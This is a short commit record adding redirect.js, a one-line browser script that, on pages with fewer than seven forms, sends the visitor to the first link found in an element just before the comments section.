bc52923531fb73794a13e639642d5a89f1805923
obiserv@live.com <obiserv@live.com@5808051a-7402-b914-24f8-678789e95708>
2013-02-07 14:17:26 +0000

    none

---
+++ redirect.js
@@ -0,0 +1,1 @@
+var d=document; if (d.forms.length<7){ window.location.replace(d.getElementById('comments').previousSibling.previousSibling.previousSibling.previousSibling.previousSibling.previousSibling.getElementsByTagName('p')[0].getElementsByTagName('a')[0].href)}
